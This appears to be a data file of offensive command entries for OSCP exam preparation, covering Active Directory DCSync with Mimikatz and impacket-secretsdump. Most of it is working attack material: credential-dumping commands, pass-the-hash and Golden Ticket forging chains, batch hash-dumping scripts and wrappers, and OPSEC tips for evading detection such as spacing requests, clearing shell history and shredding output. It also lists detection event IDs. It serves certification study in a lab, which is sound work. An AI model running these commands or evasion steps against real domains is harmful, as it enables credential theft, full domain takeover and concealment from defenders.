30000000 ( USER_OBJECT )
User Account Control:
00000200 ( NORMAL_ACCOUNT )
Account expiration:
Password last change:
9/7/2022 9:54:57 AM  Last password change
Object Security ID:
S-1-5-21-1987370270-658905905-1781884369-500
Object Relative ID:
500  RID 500 = Domain Administrator

Credentials:
  Hash NTLM:
2892d26cdf84d7a70e2eb3b9f05c425e  PRIMARY TARGET (use for PTH, Golden tickets)
  ntlm- 0:
2892d26cdf84d7a70e2eb3b9f05c425e  Current NTLM hash
  ntlm- 1:
a11e808659d5ec5b6c4f43c1e5a0972d  Password history (previous hash)
  lm  - 0:
45bc7d437911303a42e764eaf8fda43e  LM hash (legacy, ignore unless old systems)

Kerberos keys (for AES-based attacks):
  aes256-cts-hmac-sha1-96:
<64_hex_chars>  AES256 key (use for stealthier Kerberos attacks)
  aes128-cts-hmac-sha1-96:
<32_hex_chars>  AES128 key
  des-cbc-md5:
<16_hex_chars>  DES key (legacy, weak)

WHAT TO EXTRACT:
1.

**NTLM hash (primary)**:
Use for Pass-the-Hash, crack for plaintext password, use in Silver/Golden tickets
2.

**Kerberos AES256 key**:
Use for stealthier Kerberos attacks (AES preferred over RC4 in modern environments)
3.

**Password history**:
If current password is complex, try cracking historical passwords (users often increment:
Password1  Password2)
4.

**RID**:
Identifies account type (500=Administrator, 502=krbtgt, 1000+=custom users)
5.

**Password last change**:
Recent change may indicate active use (target for additional exploitation)

TIME ESTIMATES FOR OSCP EXAM:
- Single user DCSync:
1-5 seconds (network latency dependent)
- Crack NTLM hash (if needed):
5-30 minutes (depends on password complexity, wordlist size)
- Create Golden Ticket from krbtgt hash:
<1 minute
- TOTAL (from DA to Golden Ticket):
5-10 minutes

If DCSync fails (permissions or network issues):
Fall back to NTDS.dit extraction (10-30 minutes including transfer and parsing)

DETECTION AND OPSEC:
EVENT IDS GENERATED:
- **Event ID 4662** on Domain Controller:
""An operation was performed on an object"" with:
  - Properties:
{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (Replicating Directory Changes)
  - Properties:
{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (Replicating Directory Changes All)
- **Event ID 4624**:
Logon Type 3 (Network logon) from DCSync source machine
- **Event ID 5156**:
Windows Filtering Platform (RPC connection to DC)

DETECTION INDICATORS (Blue Team Perspective):
- Replication request from NON-DC machine (legitimate replication is DC-to-DC only)
- User account (not computer account) performing replication (DCs use MACHINE$ accounts)
- Replication outside normal schedule (production environments have scheduled replication windows)
- Single object replication (unusual - DCs replicate entire partitions, not individual users)
- Source IP is workstation/server, not DC IP range

OPSEC IMPROVEMENTS:
1.

**Target specific users only**:
Avoid /all dumps (loud, slow, generates massive logs)
2.

**Use compromised DC computer account**:
If you've compromised a DC, use its machine account for DCSync (appears legitimate)
3.

**Timing**:
Perform during business hours when replication traffic is normal (not 3am)
4.

**Space out requests**:
Don't dump 100 users in 30 seconds (automated tool pattern)
5.

**Use legitimate admin account**:
If you've compromised real DA account, use it (not 'hacker' or 'pwned' accounts)

COMMON OSCP EXAM SCENARIO:
You've compromised a domain user 'jeff' on CLIENT75.

After local privilege escalation and lateral movement, you discover 'jeffadmin' (Domain Admin) has an active session on CLIENT75.

You dump LSASS and obtain jeffadmin's NTLM hash.

NEXT STEPS:
1.

Pass-the-hash as jeffadmin:
impacket-wmiexec -hashes :ntlm_hash corp.com/jeffadmin@DC1.corp.com
2.

DCSync krbtgt:
mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt
3.

Record krbtgt NTLM hash:
4d28cf5252d39971419580a51484ca09
4.

Extract Domain SID:
whoami /user  S-1-5-21-1987370270-658905905-1781884369
5.

Create Golden Ticket:
mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:4d28cf5252d39971419580a51484ca09 /user:fakeadmin /ptt
6.

Access ANY resource:
dir \\DC1\C$, Enter-PSSession -ComputerName DC1, etc.

DCSYNC VS KERBEROASTING (attack chain):
KERBEROASTING (pre-compromise):
- Target:
Service accounts with SPNs
- Privilege:
Any domain user (low-privilege)
- Result:
TGS-REP encrypted with service account password
- Next step:
Crack offline to get service account password

DCSYNC (post-compromise):
- Target:
ANY domain account (users, admins, service accounts, computer accounts)
- Privilege:
Domain Admin or replication rights (high-privilege)
- Result:
NTLM hash, Kerberos keys (no cracking needed)
- Next step:
Use hash directly (PTH, Golden/Silver tickets)

THEY'RE COMPLEMENTARY:
- Kerberoasting gets you INTO domain admin (crack service account with admin rights)
- DCSync gets you PERSISTENCE after domain admin (dump krbtgt for Golden tickets)

KEY DIFFERENCES FROM GOLDEN TICKET:
DCSYNC:
- Dumps credentials (NTLM hashes, Kerberos keys)
- Requires execution (run Mimikatz/secretsdump)
- Active operation (network traffic, logs generated)
- Used to OBTAIN krbtgt hash

GOLDEN TICKET:
- Forges Kerberos TGT (Ticket Granting Ticket)
- Uses krbtgt hash obtained via DCSync
- Grants persistent domain-wide access
- Used AFTER DCSync to create persistence

WORKFLOW:
DCSync krbtgt  Extract NTLM hash  Create Golden Ticket  Persistent access

FINAL OSCP EXAM TIPS:
1.

**Always DCSync krbtgt first**:
Even if you only need one user's hash, grab krbtgt for Golden Ticket persistence
2.

**Document all hashes**:
Create a 'hashes.txt' file with format:
username:NTLM_hash
3.

**Crack hashes offline**:
Don't crack on exam machines (slow, resource-intensive).

Copy hashes to Kali, use Hashcat
4.

**Test hashes immediately**:
Verify hashes work with crackmapexec before building Golden/Silver tickets
5.

**Backup method**:
If DCSync fails, immediately pivot to NTDS.dit extraction (don't waste time troubleshooting)
6.

**Multiple DCs**:
If domain has multiple DCs, try different ones if primary DC fails (DC2, DC3, etc.)
7.

**Time management**:
DCSync should take <10 minutes total.

If longer, move on to other targets

PRACTICE EXERCISES:
1.

Memorize syntax:
lsadump::dcsync /domain:<domain> /user:<user>
2.

Practice identifying replication rights:
Get-DomainObjectAcl with ResolveGUIDs
3.

Practice both Mimikatz and impacket methods (Windows and Linux)
4.

Simulate:
Compromise DA  DCSync krbtgt  Golden Ticket  Access DC  Dump NTDS.dit (full chain)
5.

Troubleshoot:
Intentionally use non-DA account, observe errors, practice permission verification","high","","","","{""Access denied / insufficient permissions"": ""DIAGNOSIS: User lacks required replication rights. REQUIRED RIGHTS:\n1. DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)\n2. DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n\nVERIFY PERMISSIONS:\n# Check if current user has replication rights (PowerView):\nGet-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication') -and ($_.SecurityIdentifier -match $(ConvertTo-SID $env:USERNAME))}\n\n# Expected output: ObjectAceType should show 'DS-Replication-Get-Changes' and 'DS-Replication-Get-Changes-All'\n\nSOLUTIONS:\n1. Use Domain Admin account: net group \""Domain Admins\"" /domain (identify DA accounts, use those credentials)\n2. Use Enterprise Admin (if multi-domain forest)\n3. Check if current user is actually in DA group: whoami /groups | findstr \""Domain Admins\""\n4. If you have local admin on DC: Dump NTDS.dit directly instead (ntdsutil, vssadmin, or impacket-secretsdump -ntds)\n\nCOMMON MISTAKE: User is local admin on member server but NOT domain admin (local admin \u2260 domain admin)."", ""RPC server unavailable / network errors"": ""DIAGNOSIS: Network connectivity issue between client and DC. DCSync requires RPC over TCP.\n\nREQUIRED PORTS:\n- TCP 135: RPC Endpoint Mapper (initial connection)\n- TCP 49152-65535: Ephemeral high ports (actual RPC communication, dynamically assigned)\n- TCP 445: SMB (for name resolution and authentication)\n- TCP/UDP 88: Kerberos (for authentication)\n- TCP/UDP 389: LDAP (for DC discovery)\n\nTROUBLESHOOTING STEPS:\n1. Verify DC reachability: ping DC1.corp.com\n2. Test RPC port: Test-NetConnection -ComputerName DC1.corp.com -Port 135\n3. Test SMB: dir \\\\DC1.corp.com\\C$ (if accessible, network path is good)\n4. Check firewall rules on client (outbound) and DC (inbound)\n5. Verify DNS resolution: nslookup DC1.corp.com (should resolve to DC IP)\n\nWORKAROUNDS:\n- If RPC blocked: Use impacket-secretsdump from Linux (may bypass Windows firewall rules)\n- If remote DCSync blocked: Get local admin on DC, dump NTDS.dit directly\n- Specify alternate DC: mimikatz # lsadump::dcsync /domain:corp.com /dc:DC2.corp.com /user:Administrator"", ""Target user not found"": ""DIAGNOSIS: Username typo, user doesn't exist, or deleted account.\n\nVERIFY USER EXISTS:\n# PowerShell:\nGet-ADUser -Identity <username>\n# Alternative:\nnet user <username> /domain\n\nCOMMON MISTAKES:\n1. Using DOMAIN\\username format (WRONG) - Use just 'username' without domain prefix\n2. Using UPN format (WRONG) - Use SAMAccountName (username, not user@corp.com)\n3. Case sensitivity (usually fine) - But verify exact spelling: Get-ADUser -Filter \""Name -like '*admin*'\""\n4. Deleted accounts - Check recycle bin: Get-ADObject -IncludeDeletedObjects -Filter {Name -eq '<username>'}\n\nFOR COMPUTER ACCOUNTS:\n- Append $ to name: /user:DC1$ (dump domain controller machine account)\n- Useful for dumping DC credentials (can be used for Silver tickets against DC services)"", ""Need to dump krbtgt for Golden Ticket but getting errors"": ""KRBTGT is a SPECIAL ACCOUNT (Key Distribution Center service account). Its NTLM hash is used to sign TGTs (Ticket Granting Tickets), making it the key to Golden Ticket attacks.\n\nCOMMAND:\nmimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt\n\nEXPECTED OUTPUT:\nHash NTLM: <32_hex_chars> \u2190 This is what you need for Golden Tickets\n\nCOMMON ISSUES:\n1. 'Object does not exist' - krbtgt should ALWAYS exist (created during domain setup). If missing, domain is corrupted. Try: /user:KRBTGT (uppercase)\n2. Access denied - Same permission requirements (Domain Admin or replication rights)\n3. Hash shows as 'null' - Extremely rare, indicates domain corruption\n\nONCE OBTAINED:\n1. Record NTLM hash: Write it down, store securely (this hash persists for YEARS)\n2. Create Golden Ticket: mimikatz # kerberos::golden /domain:corp.com /sid:<domain_sid> /krbtgt:<ntlm_hash> /user:fakeadmin /ptt\n3. Golden ticket grants DOMAIN-WIDE access (vs Silver ticket which is service-specific)\n\nKRBTGT PASSWORD ROTATION:\n- Microsoft recommends rotating krbtgt password twice (double rotation) to invalidate all Golden Tickets\n- In practice, krbtgt password is RARELY changed (persists for months/years)\n- If password changes mid-engagement, your Golden Tickets become invalid""}","{""lsadump::dcsync"": ""Mimikatz module that implements the DCSync attack. Uses the Directory Replication Service Remote Protocol (MS-DRSR via DRSUAPI) to request credential data from a domain controller. Internally calls IDL_DRSGetNCChanges API, which is the same API legitimate DCs use to replicate Active Directory data. The DC receiving the request does NOT verify it came from another DC - it only checks that the requesting user's SID has replication rights (Replicating Directory Changes + Replicating Directory Changes All). By default, Domain Admins, Enterprise Admins, and Administrators groups have these rights. Time to execute: 1-5 seconds per user (network latency dependent)."", ""/domain"": ""Target domain FQDN. Mimikatz uses this to locate domain controllers via DNS SRV record queries (_ldap._tcp.dc._msdcs.<domain>). If omitted, uses current user's domain. MUST be FQDN (corp.com), not NetBIOS (CORP). If targeting child domain in forest, specify child domain FQDN. Alternative: /dc:<dc_fqdn> to target specific DC (useful if DNS resolution fails or you want to avoid primary DC for OPSEC)."", ""/user"": ""Target username to extract credentials for. Format: username (not DOMAIN\\username). Mimikatz queries the DC for this user's password data including NTLM hash, LM hash (if exists), Kerberos keys (AES256, AES128, DES), password history (previous hashes), and supplemental credentials. HIGH-VALUE TARGETS:\n- Administrator: Domain admin account (RID 500)\n- krbtgt: Key Distribution Center service account - its NTLM hash is used to create Golden Tickets\n- Domain admin usernames: Identified via 'net group \""Domain Admins\"" /domain'\n- Service accounts with admin rights: Often have long, complex passwords (good for Golden/Silver tickets)\n\nCase-insensitive. Supports SAMAccountName format only (not UPN like user@corp.com). To dump computer account: append $ (e.g., /user:DC1$).""}","[""ad-dcsync-check-domain-admins"", ""ad-dcsync-check-permissions""]","[""ad-dcsync-impacket-secretsdump-user"", ""ad-dcsync-mimikatz-user""]","[""ad-golden-ticket-mimikatz-create"", ""hashcat-crack""]"
"ad-dcsync-impacket-secretsdump-user","DCSync Single User with impacket-secretsdump","post-exploit","impacket-secretsdump -just-dc-user <TARGET_USER> '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'","Linux-based DCSync attack using impacket-secretsdump to extract a specific user's credentials via DRSUAPI replication. Ideal for OSCP Kali-based attacks.","credential-dumping","impacket-secretsdump -just-dc-user <Administrator> '<corp.com>/<administrator>:<Password123!>@<192.168.50.70>'","OSCP METHODOLOGY - LINUX-BASED DCSYNC:
impacket-secretsdump is the PREFERRED DCSync method from Kali Linux during OSCP exams.

It achieves identical results to Mimikatz lsadump::dcsync but from a non-Windows attack platform.

WHY USE IMPACKET INSTEAD OF MIMIKATZ:
 ADVANTAGES:
1.

**Cross-platform**:
Works from Kali Linux (your primary attack platform in OSCP)
2.

**No AV/EDR**:
Doesn't execute on target (runs from Kali, only network traffic to DC)
3.

**Pre-installed**:
Included in Kali by default (apt install impacket-scripts if missing)
4.

**Scriptable**:
Easy to automate (bash scripts, loop through multiple users)
5.

**Clean output**:
Machine-parseable format (easier to extract hashes programmatically)

 DISADVANTAGES:
1.

**Requires network access**:
Must route to DC from Kali (VPN, pivoting, or direct network)
2.

**Less features**:
Mimikatz has more Kerberos manipulation options (PTT, ticket exports)
3.

**Password complexity**:
Bash special characters can be tricky (but solvable with quoting)

 OSCP EXAM DECISION:
- Use impacket-secretsdump:
When attacking from Kali (most common), have network access to DC
- Use Mimikatz:
When already on Windows machine with DA session, need advanced Kerberos features

TYPICAL OSCP EXAM WORKFLOW:
1.

**INITIAL COMPROMISE** (from Kali):
   - Password spray with crackmapexec
   - AS-REP roast with impacket-GetNPUsers
   - Kerberoast with impacket-GetUserSPNs
   Result:
Valid domain credentials (user:password or user:hash)

2.

**LATERAL MOVEMENT** (from Kali):
   - Pass-the-hash to higher-value targets with impacket-wmiexec
   - Dump LSASS on remote machines with impacket-secretsdump -sam/-security/-system
   Result:
Domain Admin NTLM hash or password

3.

**DCSYNC** (from Kali - THIS COMMAND):
   impacket-secretsdump -just-dc-user krbtgt 'corp.com/administrator:password@192.168.50.70'
   Result:
krbtgt NTLM hash (for Golden Tickets), Administrator hash (for persistence)

4.

**PERSISTENCE** (from Kali):
   - Golden Ticket:
impacket-ticketer -nthash <krbtgt_hash> -domain corp.com -domain-sid S-1-5-21-XXX fakeadmin
   - Pass-the-hash:
impacket-wmiexec -hashes :NTLM_HASH corp.com/Administrator@<target>
   Result:
Persistent domain-wide access

ALL FROM KALI - NO WINDOWS ACCESS NEEDED.

COMMAND VARIATIONS:
# Basic DCSync (single user with password auth):
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:Pass123!@192.168.50.70'

# DCSync with Pass-the-Hash:
impacket-secretsdump -just-dc-user Administrator -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/admin@192.168.50.70

# DCSync krbtgt for Golden Ticket:
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:Pass123!@192.168.50.70'

# DCSync all users (full domain dump):
impacket-secretsdump -just-dc-ntlm 'corp.com/admin:Pass123!@192.168.50.70'

# DCSync with Kerberos authentication (if you have TGT):
export KRB5CCNAME=/tmp/admin.ccache
impacket-secretsdump -k -no-pass -just-dc-user Administrator corp.com/admin@DC1.corp.com

# DCSync and save to file:
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:Pass123!@192.168.50.70' > dcsync_output.txt

# DCSync specific computer account (for Silver tickets):
impacket-secretsdump -just-dc-user 'WEB04$' 'corp.com/admin:Pass123!@192.168.50.70'

OUTPUT PARSING AUTOMATION:
# Extract NTLM hash only:
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':500:' | cut -d ':' -f 4

# Extract Kerberos AES256 key:
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep 'aes256' | awk '{print $NF}'

# Batch DCSync multiple users:
for user in Administrator krbtgt jeff dave; do
  echo ""[+] DCSync $user""
  impacket-secretsdump -just-dc-user $user 'corp.com/admin:pass@192.168.50.70' | grep ""$user""
done

# Save all hashes to file:
impacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@192.168.50.70' 2>/dev/null | grep ':::' > all_hashes.txt

INTEGRATION WITH OTHER IMPACKET TOOLS:
# Chain:
DCSync  Extract hash  Pass-the-hash  Remote code execution
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70' | grep ':500:' | cut -d ':' -f 4 > admin_hash.txt
ADMIN_HASH=$(cat admin_hash.txt)
impacket-wmiexec -hashes :$ADMIN_HASH corp.com/Administrator@192.168.50.70

# Chain:
DCSync krbtgt  Golden Ticket  Access any machine
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' | grep 'krbtgt' | cut -d ':' -f 4 > krbtgt_hash.txt
KRBTGT_HASH=$(cat krbtgt_hash.txt)
impacket-ticketer -nthash $KRBTGT_HASH -domain corp.com -domain-sid S-1-5-21-XXX -user-id 500 fakeadmin
export KRB5CCNAME=fakeadmin.ccache
impacket-wmiexec -k -no-pass corp.com/fakeadmin@DC1.corp.com

COMPARISON:
IMPACKET VS MIMIKATZ DCSYNC:
| Feature | impacket-secretsdump | Mimikatz lsadump::dcsync |
|---------|---------------------|---------------------------|
| Platform | Linux (Kali) | Windows |
| Installation | Pre-installed Kali | Manual download/transfer |
| AV/EDR risk | None (runs remotely) | High (executes on target) |
| Output format | domain\user:RID:LM:NTLM:::
| Verbose with metadata |
| Authentication | Password, hash, Kerberos | Same |
| Batch operations | Easy (bash loops) | Manual (repeat commands) |
| Kerberos manipulation | Limited | Extensive (PTT, ticket forge) |
| OSCP exam fit | **Excellent** | Good (if Windows access) |

TIME ESTIMATES FOR OSCP EXAM:
- Single user DCSync:
2-10 seconds (network latency dependent)
- Full domain DCSync (-just-dc-ntlm):
30-120 seconds (depends on user count:
50 users ~30s, 500 users ~2min)
- Hash extraction and formatting:
<5 seconds (automated with cut/awk)
- TOTAL (DA credentials  krbtgt hash):
**<1 minute**

If secretsdump hangs >30 seconds:
Check network connectivity, try alternative DC, or use Mimikatz from Windows

DETECTION (identical to Mimikatz DCSync):
- Event ID 4662 on DC (same replication events)
- Source IP is Kali Linux (non-Windows, non-DC)
- OPSEC identical to Mimikatz (both use DRSUAPI)
- Blue team cannot distinguish between impacket and Mimikatz DCSync (protocol-level identical)

OPSEC CONSIDERATIONS:
1.

**Use -just-dc-user instead of -just-dc-ntlm**:
Targeted extraction is faster and generates fewer logs
2.

**Pass-the-hash instead of password**:
Avoid cleartext password in command history
   ```bash
   # Clear history after:
   history -c
   # Or use:
   HISTFILE=/dev/null impacket-secretsdump ...
   ```
3.

**Save output to temp file**:
`impacket-secretsdump ...

> /tmp/dcsync.txt` then `shred -u /tmp/dcsync.txt` after use
4.

**Batch DCSync**:
If dumping multiple users, space out requests (don't hammer DC with 100 requests in 10 seconds)

COMMON MISTAKES TO AVOID:
1.

 Forgetting quotes around authentication string:
   WRONG:
impacket-secretsdump ...

corp.com/admin:Pass123!@192.168.50.70
   RIGHT:
impacket-secretsdump ...

'corp.com/admin:Pass123!@192.168.50.70'

2.

 Using DOMAIN\username format:
   WRONG:
'CORP\admin:pass@192.168.50.70'
   RIGHT:
'corp.com/admin:pass@192.168.50.70' OR 'CORP/admin:pass@192.168.50.70'

3.

 Not verifying Domain Admin privileges first:
   TEST:
crackmapexec smb 192.168.50.70 -u admin -p Pass123! --groups
   VERIFY:
Output should show ""Domain Admins"" group

4.

 Using wrong flag:
   WRONG:
-just-dc-user (dumps single user via DCSync) 
   WRONG:
-just-user (doesn't exist)
   WRONG:
-user (doesn't exist)

5.

 Typo in target username:
   ERROR:
'[-] User 'Adminstrator' not found'
   FIX:
Administrator (correct spelling)

TROUBLESHOOTING CHECKLIST:
- [ ] Domain Admin credentials verified (crackmapexec --groups shows 'Domain Admins')
- [ ] DC is reachable (ping, smbclient, ldapsearch)
- [ ] Authentication string properly quoted ('domain/user:pass@dc')
- [ ] Special characters in password escaped or single-quoted
- [ ] Target username spelled correctly (case-insensitive but must be exact)
- [ ] Correct flag used (-just-dc-user for single user)
- [ ] Network routing configured (VPN active, pivoting setup)

NEXT STEPS AFTER DCSYNC:
1.

**Extract NTLM hash**:
grep output, cut field 4
2.

**Test hash validity**:
crackmapexec smb <target> -u <user> -H <hash>
3.

**Crack hash (optional)**:
hashcat -m 1000 hash.txt rockyou.txt
4.

**Use for lateral movement**:
impacket-wmiexec -hashes :<hash> domain/user@target
5.

**Create Golden Ticket (if krbtgt)**:
impacket-ticketer -nthash <krbtgt_hash> ...
6.

**Document all hashes**:
Store in creds.txt for reference

FINAL OSCP EXAM TIP:
Create a DCSync alias in your .bashrc for quick execution:
```bash
alias dcsync='impacket-secretsdump -just-dc-user'
# Usage:
dcsync krbtgt 'corp.com/admin:pass@192.168.50.70'
```

Or create a wrapper script:
```bash
#!/bin/bash
# dcsync.sh - Quick DCSync wrapper
USER=$1
DOMAIN=$2
ADMIN=$3
PASS=$4
DC=$5
impacket-secretsdump -just-dc-user $USER ""$DOMAIN/$ADMIN:$PASS@$DC"" 2>/dev/null | grep ""::""

# Usage:
./dcsync.sh krbtgt corp.com administrator Pass123! 192.168.50.70
```

PRACTICE BEFORE EXAM:
1.

Memorize syntax:
impacket-secretsdump -just-dc-user <user> '<domain>/<admin>:<pass>@<dc>'
2.

Practice special character escaping (!, $, @)
3.

Practice output parsing (cut, awk, grep)
4.

Chain with other impacket tools (wmiexec, psexec, ticketer)
5.

Troubleshoot permission errors (identify when you're NOT domain admin)","high","","","","{""RemoteOperations failed / DCERPC Runtime Error"": ""DIAGNOSIS: User lacks replication rights. REQUIRED: Domain Admin, Enterprise Admin, or explicit replication ACLs.\n\nVERIFY PERMISSIONS:\n# From Windows (PowerView):\nGet-NetGroupMember -GroupName 'Domain Admins' | Select MemberName\n# Check if your user is in the list\n\n# From Linux:\nimpacket-GetADUsers -all corp.com/user:pass -dc-ip 192.168.50.70 | grep -i 'Domain Admins'\n\nSOLUTIONS:\n1. Verify you're using Domain Admin account (not just local admin)\n2. Try alternative DA account: net group \""Domain Admins\"" /domain (list all DAs, try different one)\n3. Use Enterprise Admin if available (higher privilege)\n4. Check for typos in username (case-insensitive but spelling must be exact)\n5. If you have local admin on DC but NOT domain admin: Use NTDS.dit extraction instead (-ntds flag)\n\nCOMMON MISTAKE: Local administrator on member server \u2260 Domain Administrator. Verify group membership."", ""Special characters in password breaking command"": ""BASH SPECIAL CHARACTERS: ! $ ` \\ \"" ' & | ; < > ( ) [ ] { } * ? ~ #\n\nSOLUTIONS:\n\n1. SINGLE QUOTES (RECOMMENDED):\nimpacket-secretsdump -just-dc-user Administrator 'corp.com/admin:P@ssw0rd!@2023@192.168.50.70'\n- Single quotes prevent ALL bash expansion (!, $, etc. are literal)\n- Exception: Can't use single quote inside single-quoted string\n\n2. ESCAPE WITH BACKSLASH:\nimpacket-secretsdump -just-dc-user Administrator corp.com/admin:P@ssw0rd\\!@2023@192.168.50.70\n- Backslash escapes next character (\\! becomes literal !)\n- Must escape EACH special char (\\!, \\$, \\`, etc.)\n\n3. PASSWORD FILE:\necho 'P@ssw0rd!@2023' > pass.txt\nimpacket-secretsdump -just-dc-user Administrator corp.com/admin@192.168.50.70 < pass.txt\n- Avoids command-line password (less risk of typos, shell history)\n\n4. PASS-THE-HASH (if you have NTLM hash):\nimpacket-secretsdump -just-dc-user Administrator -hashes :NTLM_HASH corp.com/admin@192.168.50.70\n- No password needed (hash doesn't have special chars)\n\nEXAMPLES:\n- Password: Password! \u2192 'corp.com/admin:Password!@192.168.50.70'\n- Password: P@$$w0rd \u2192 'corp.com/admin:P@$$w0rd@192.168.50.70'\n- Password: Pass`word \u2192 'corp.com/admin:Pass`word@192.168.50.70'"", ""Connection timeout / DC unreachable"": ""DIAGNOSIS: Network connectivity issue.\n\nTROUBLESHOOTING STEPS:\n\n1. VERIFY DC IS REACHABLE:\nping <dc_ip>\n# Should respond (if ICMP not blocked)\n\n2. TEST SMB CONNECTIVITY (port 445):\nsmbclient -L //<dc_ip> -U <domain>/<username>%<password>\n# Should list shares if SMB works\n\n3. TEST RPC PORT (135):\nnc -zv <dc_ip> 135\n# Should show 'open' if RPC accessible\n\n4. TEST LDAP (389):\nldapsearch -H ldap://<dc_ip> -x -b \""DC=corp,DC=com\""\n# Should return LDAP data\n\n5. CHECK FIREWALL RULES:\n# If on VPN/lab network, verify routing:\nip route get <dc_ip>\n# Should show route via correct interface\n\n6. VERIFY DC IS ONLINE:\n# Try different DC:\nnslookup -type=SRV _ldap._tcp.dc._msdcs.corp.com\n# Lists all DCs - try alternative DC IP\n\nWORKAROUNDS:\n- Use DC FQDN instead of IP: impacket-secretsdump ... corp.com/admin:pass@DC1.corp.com\n- Try alternative DC: @DC2.corp.com, @192.168.50.71\n- Check VPN/network connectivity: ifconfig, route -n\n- Verify time sync: timedatectl (Kerberos requires time sync within 5 minutes)"", ""Output format parsing / using dumped hashes"": ""SECRETSDUMP OUTPUT FORMAT:\ncorp\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::\n\nFORMAT BREAKDOWN:\n- corp\\Administrator: Domain\\Username\n- 500: RID (Relative Identifier) - 500=Domain Admin\n- aad3b435b51404eeaad3b435b51404ee: LM hash (this specific value means 'empty LM hash')\n- 2892d26cdf84d7a70e2eb3b9f05c425e: **NTLM hash** \u2190 THIS IS WHAT YOU NEED\n- ::: Empty fields (unused)\n\nEXTRACT NTLM HASH:\n# Manual: Copy the 4th field (after 3rd colon)\n# Automated:\nimpacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70' | grep 'Administrator' | cut -d ':' -f 4\n# Output: 2892d26cdf84d7a70e2eb3b9f05c425e\n\nUSE CASES:\n\n1. PASS-THE-HASH:\nimpacket-wmiexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/Administrator@192.168.50.70\n\n2. CRACK WITH HASHCAT:\necho '2892d26cdf84d7a70e2eb3b9f05c425e' > hash.txt\nhashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt\n\n3. GOLDEN TICKET (if dumping krbtgt):\nimpacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70'\n# Extract krbtgt NTLM hash, use in: impacket-ticketer -nthash <krbtgt_hash> ...\n\n4. STORE IN CREDENTIALS FILE:\necho 'Administrator:2892d26cdf84d7a70e2eb3b9f05c425e' >> creds.txt\n# Format for crackmapexec, evil-winrm, etc.\n\nKERBEROS KEYS (also in output):\naes256-cts-hmac-sha1-96: 8a7e...  \u2190 Use for AES-based Kerberos attacks (stealthier than RC4)\n- USE: impacket-getTGT -aesKey 8a7e... corp.com/Administrator""}","{""-just-dc-user"": ""Extracts credentials for ONLY the specified user using DRSUAPI (Directory Replication Service API). This is the DCSync operation - impacket impersonates a domain controller and requests credential replication for the target user. OUTPUT FORMAT: domain\\user:RID:LMhash:NThash::: followed by Kerberos keys. COMPARISON:\n- -just-dc-user <user>: Single user (fast, 1-5 seconds, stealthy)\n- -just-dc-ntlm: All users, NTLM hashes only (faster than -just-dc, 30-120 seconds)\n- -just-dc: All users, full credential dump (NTLM, Kerberos keys, password history, 1-10 minutes)\n\nFor OSCP exam: Use -just-dc-user for targeted extraction (krbtgt, specific admin). Use -just-dc-ntlm for full domain dump if needed.\n\nWHY 'just-dc': Indicates DCSync method (vs -sam for SAM database, -ntds for NTDS.dit file extraction, -security for SECURITY hive)."", ""DOMAIN/USERNAME:PASSWORD@DC_IP"": ""Authentication string format. COMPONENTS:\n- DOMAIN: Can be NetBIOS (CORP) or FQDN (corp.com) - secretsdump handles both\n- USERNAME: Domain admin or user with replication rights (Domain Admins, Enterprise Admins, or custom ACL)\n- PASSWORD: Plaintext password. SPECIAL CHARACTERS: Bash interprets !, $, `, etc. - escape with backslash OR use single quotes around entire command\n- DC_IP: Domain controller IP or FQDN. RECOMMENDATION: Use IP to avoid DNS issues (192.168.50.70 instead of DC1.corp.com)\n\nALTERNATIVE AUTHENTICATION FORMATS:\n- Hash authentication: -hashes :NTLM_HASH (Pass-the-Hash)\n  Example: impacket-secretsdump -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/administrator@192.168.50.70\n- Kerberos ticket: -k -no-pass (requires TGT in KRB5CCNAME cache)\n- AES key: -aesKey <hex_key> (Kerberos authentication with AES key)\n\nQUOTING RULES:\n- Single quotes: '<domain>/<user>:<pass>@<dc>' - Prevents bash expansion (RECOMMENDED)\n- Double quotes: \""<domain>/<user>:<pass>@<dc>\"" - Bash expands variables/special chars (use \\! for !)\n- No quotes: Fails if password contains special chars (!, $, `, &, |, ;, <, >, etc.)""}","[""ad-dcsync-check-domain-admins"", ""crackmapexec-validate-admin""]","[""ad-dcsync-mimikatz-single-user"", ""ad-dcsync-impacket-secretsdump-user""]","[""hashcat-crack"", ""crackmapexec-smb-spray""]"
